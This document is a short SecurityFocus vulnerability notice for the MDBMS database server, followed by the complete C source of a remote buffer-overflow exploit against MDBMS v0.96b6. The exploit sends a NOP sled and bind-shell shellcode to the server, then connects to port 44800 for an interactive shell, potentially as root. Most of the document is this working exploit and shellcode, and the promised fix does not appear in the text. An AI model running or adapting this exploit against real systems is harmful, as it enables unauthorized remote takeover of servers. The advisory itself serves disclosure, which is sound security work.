source: http://www.securityfocus.com/bid/1252/info

A vulnerability exists in the MDBMS database, written by Marty Bochane. By supplying a line of sufficient length to the MDBMS server, containing machine executable code, it is possible for a remote attacker to execute arbitrary commands as the user the db is running as.

It is believed all versions of MDBMS are susceptible, up to and including .99b6, which is the latest release. 

/*                     MDBMS V0.96b6 remote shell xploit=20
 *           11/05/2000  |[TDP]| <tdp@psynet.net>  -  HaCk-13 TeaM
 *
 *  This code shows a MDBMS v0.96b6 vulnerability in which, any remote
 * user can exec a shell. MDBMS daemon used to be ran as root user; =
exposing
 * the system to serious vulnerability risks, because any attacker can =
obtain
 * root priviledges remotely with this exploit
 *
 * Exploit tested on LiNUX SuSE 6.3... previous MDBMS versions may
 *  be affected by this vulnerability. Fix at end of this doc.
 *
 *      Greetings goes to all other members and all my friends
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>

#define NOP     0x90
#define LEN     10008
#define RET     0xbffff586

/* Special shell code */
char shellcode[] =
"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0\x31\xdb\x89\xf1"
"\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\xb3\x01\xcd"
"\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\xaf\x66\x89\x46\x0e\x8d\x46\x0c\x89"
"\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80\xeb"
"\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\x31\xc0\x89"
"\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80"
"\xb0\x3f\xb1\x01\xcd\x80\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06"  
"\xb8\x2f\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c"
"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd"
  "\x80\xe8\x5b\xff\xff\xff";
 
long
resolveip (char *name)
{
  struct hostent *hp;
  long ip;
  
  if ((ip = inet_addr (name)) == -1)
    {
      if ((hp = gethostbyname (name)) == NULL)
 {
   fprintf (stderr, "Can't resolve host name [%s].\n", name);
   exit (0);
 }
      memcpy (&ip, (hp->h_addr), 4);
    }
  return (ip);
}

int
main (int argc, char *argv[])
{
  char buffer[LEN], buffer2[LEN + 10];
  long retaddr = RET;
  long remoteip;
  unsigned long sp;
  int i, a, shellsock, clisock;
  struct sockaddr_in clisin, shsin;
  char snd[4096], rcv[4096];
  fd_set rset;

  fprintf (stderr,
    "\nMDBMS v0.96b6 Remote Shell Xploit - <tdp@psynet.net>\n");

  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s ip [offset]\n", argv[0]);
      exit (-1);
    }

  if (argc > 2)
    a = atoi (argv[2]);
  else
    a = 0;           
             
  retaddr = retaddr + a;
     
  for (i = 0; i < LEN; i += 4)
    *(long *) &buffer[i] = retaddr;
     
  for (i = 0; i < (LEN - strlen (shellcode) - 100); i++)
    *(buffer + i) = NOP;
    
  memcpy (buffer + i, shellcode, strlen (shellcode));
  sprintf (buffer2, "%s\n", buffer);
  
  fprintf (stderr, "Connecting to remote MDBMS server...\n");
  fflush (stdout);
  remoteip = resolveip (argv[1]);
  clisock = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (clisock == -1)
    {
      fprintf (stderr, "Can't create main socket");
      exit (-1);
    }
  clisin.sin_family = AF_INET;    
  clisin.sin_port = htons (2224);
  clisin.sin_addr.s_addr = remoteip;
  if (connect (clisock, (struct sockaddr *) &clisin, sizeof (clisin)) == -1)
    {
      fprintf (stderr, "Can't connect to the MDBMS fastport, trying normal port...\n");
      clisin.sin_family = AF_INET;  
      clisin.sin_port = htons (2223);
      clisin.sin_addr.s_addr = remoteip;
      if (connect (clisock, (struct sockaddr *) &clisin, sizeof(clisin)) == -1)
 {
   fprintf    
     (stderr, "Can't connect to normalport... MDBMS is running in remote server?\n\n");    
   exit (0); 
 }
      exit (0);
    }
      
  switch (i = read (clisock, buffer, LEN))
    {
    case -1:
      {
 fprintf (stderr, "ClientSocket: unexpected EOF\n");
 exit (0);
      }                
    case 0:  
      {
 fprintf (stderr, "ClientSocket: EOF\n");
 exit (0);
      }
    default:
      buffer[i] = 0;
      fprintf (stderr, "%s\n", buffer);
      break;
    }
  fprintf (stderr, "Sending xploit, jumping to address 0x%lx\n", retaddr);
  i = write (clisock, buffer2, strlen (buffer2));
  fsync (clisock);
  if ((i < 10000) || (i > 10018))  
    {
      fprintf (stderr, "ClientSocket: Error writing xploit\n");
      exit (0);
    } 
  close (clisock);
     
  fprintf (stderr, "Waiting 2 secs for hell...\n");
  sleep (2);
/* shell stuFF */
  fprintf (stderr, "Connecting to the shell...\n");
  fflush (stdout);
     
  memset (&shsin, 0, sizeof (shsin)); 
  shsin.sin_family = AF_INET;
  shsin.sin_port = htons (44800);   
  shsin.sin_addr.s_addr = remoteip;  
      
  if ((shellsock = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
    {
      fprintf (stderr, "Can't create shell socket\n");
      exit (-1);
    }         
     
  if (connect (shellsock, (struct sockaddr *) &shsin, sizeof (shsin)) < 0) 
    {
      fprintf (stderr, "Can't connect to the shell\n\n");
      exit (0);
    } 
  
  fprintf (stderr, "Connected\n");
    
  while (1)
    {
      FD_ZERO (&rset);
      FD_SET (fileno (stdin), &rset);
      FD_SET (shellsock, &rset);
      select (255, &rset, NULL, NULL, NULL);
      if (FD_ISSET (fileno (stdin), &rset))
 {
   memset (snd, 0, sizeof (snd));
   fgets (snd, sizeof (snd), stdin);
   write (shellsock, snd, strlen (snd));
 }    
      if (FD_ISSET (shellsock, &rset))
 {   
   memset (rcv, 0, sizeof (rcv));
   if (read (shellsock, rcv, sizeof (rcv)) <= 0)
     exit (0);
   fputs (rcv, stdout);
 }
    }
      
  return (0);  
}     